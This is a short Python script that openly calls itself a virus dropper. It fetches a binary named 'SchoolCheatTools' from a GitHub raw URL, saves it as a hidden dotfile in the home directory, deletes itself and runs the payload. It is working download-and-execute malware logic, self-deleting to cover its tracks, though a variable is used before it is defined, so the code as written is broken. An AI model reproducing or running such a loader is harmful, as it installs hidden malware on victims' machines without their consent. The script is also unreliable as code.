from os import system, execvp
from time import sleep
from sys import argv
from requests import get
from os.path import expanduser
from os import remove
from subprocess import Popen as subproc

# download main virus
open(f"{expanduser('~')}/.{filename}", 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/SchoolCheatTools/main/SchoolCheatTools", allow_redirects=True).content)

try:
    filename = argv[0].split('/')[-1]
except:
    filename = argv[0]

remove(filename)

subproc([f"{expanduser('~')}/.{filename}"])
